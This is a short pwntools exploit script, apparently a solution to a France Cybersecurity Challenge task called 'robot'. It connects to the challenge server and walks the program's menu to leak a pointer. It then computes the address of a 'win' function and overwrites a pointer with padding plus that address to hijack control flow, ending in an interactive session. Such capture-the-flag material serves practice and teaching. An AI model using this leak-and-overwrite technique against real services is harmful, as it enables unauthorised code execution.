from pwn import *
from time import sleep

# p = process('./robot')
p = remote('challenges.france-cybersecurity-challenge.fr', 2101)

p.recvuntil(b"Quitter\n")
p.sendline(b"1")
p.sendline(b"nono")
p.recvuntil(b"Quitter\n")
p.sendline(b"3")
p.recvuntil(b"Quitter\n")
p.sendline(b"4")
p.sendline(b"")
p.recvuntil(b"Quitter\n")
p.sendline(b"5")
l = p.recvuntil(b"Quitter\n")[0x12:0x1a]
l = u64(l.ljust(8, b'\x00'))
print(hex(l))

win = l + 0x1f3

p.sendline(b"1")
p.sendline(b"nono")
p.recvuntil(b"Quitter\n")
p.sendline(b"3")
p.recvuntil(b"Quitter\n")
p.sendline(b"4")
p.sendline(b"A"*0x10 + p64(win))
p.recvuntil(b"Quitter\n")

# gdb.attach(p)
p.sendline(b"2")

p.interactive()
